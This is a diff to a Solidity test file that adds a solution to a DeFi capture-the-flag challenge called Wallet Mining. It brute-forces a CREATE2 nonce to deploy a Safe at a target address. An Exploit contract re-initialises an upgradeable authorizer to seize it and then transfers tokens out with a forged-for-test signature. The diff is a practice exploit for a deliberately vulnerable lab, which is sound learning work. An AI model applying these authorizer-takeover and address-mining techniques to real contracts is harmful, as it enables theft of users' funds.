@@ -123,7 +123,67 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
-        
+        // Plain 1-of-1 Safe setup call data
+        address[] memory _owners = new address[](1);
+        _owners[0] = user;
+        bytes memory wat = abi.encodeWithSelector(
+            Safe.setup.selector, _owners, 1, address(0), new bytes(0), address(0), address(0), 0, address(0)
+        );
+
+        // Mine num (nonce)
+        uint256 num;
+        bytes32 init = keccak256(wat);
+        address safeDeployerAddr = address(walletDeployer.cook());
+        bytes memory creationCode = proxyFactory.proxyCreationCode();
+        for (uint256 i = 0; i < UINT256_MAX; i++) {
+            bytes32 salt = keccak256(abi.encodePacked(init, i));
+            if (
+                Create2.computeAddress(
+                    salt,
+                    keccak256(abi.encodePacked(creationCode, abi.encode(address(singletonCopy)))),
+                    safeDeployerAddr
+                ) == USER_DEPOSIT_ADDRESS
+            ) {
+                num = i;
+                break;
+            }
+        }
+
+        // Sign token transfer from Safe to user
+        bytes memory transferData = abi.encodeWithSelector(token.transfer.selector, user, DEPOSIT_TOKEN_AMOUNT);
+        bytes32 safeTxHash = keccak256(
+            abi.encode(
+                bytes32(0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8),
+                address(token),
+                0,
+                keccak256(transferData),
+                Enum.Operation.Call,
+                0,
+                0,
+                0,
+                address(0),
+                address(0),
+                0
+            )
+        );
+        bytes32 message = keccak256(
+            abi.encodePacked(
+                bytes1(0x19),
+                bytes1(0x01),
+                keccak256(
+                    abi.encode(
+                        bytes32(0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218),
+                        uint256(block.chainid),
+                        USER_DEPOSIT_ADDRESS
+                    )
+                ),
+                safeTxHash
+            )
+        );
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, message);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        new Exploit(walletDeployer, USER_DEPOSIT_ADDRESS, wat, num, ward, user, signature);
     }
 
     /**
@@ -154,5 +214,37 @@ contract WalletMiningChallenge is Test {
 
         // Player sent payment to ward
         assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
+    }
+}
+
+contract Exploit {
+    constructor(
+        WalletDeployer walletDeployer,
+        address userDepositAddress,
+        bytes memory wat,
+        uint256 num,
+        address ward,
+        address user,
+        bytes memory signature
+    ) {
+        // Defeat the authorizer
+        address[] memory wards = new address[](1);
+        wards[0] = address(this);
+        address[] memory aims = new address[](1);
+        aims[0] = userDepositAddress;
+        AuthorizerUpgradeable(walletDeployer.mom()).init(wards, aims);
+
+        // Deploy the missing Safe
+        walletDeployer.drop(userDepositAddress, wat, num);
+
+        // Rescue wallet deployer tokens
+        DamnValuableToken token = DamnValuableToken(walletDeployer.gem());
+        token.transfer(ward, token.balanceOf(address(this)));
+
+        // Rescue user tokens
+        bytes memory data = abi.encodeWithSelector(token.transfer.selector, user, token.balanceOf(userDepositAddress));
+        Safe(payable(userDepositAddress)).execTransaction(
+            address(token), 0, data, Enum.Operation.Call, 0, 0, 0, address(0), payable(address(0)), signature
+        );
     }
 }
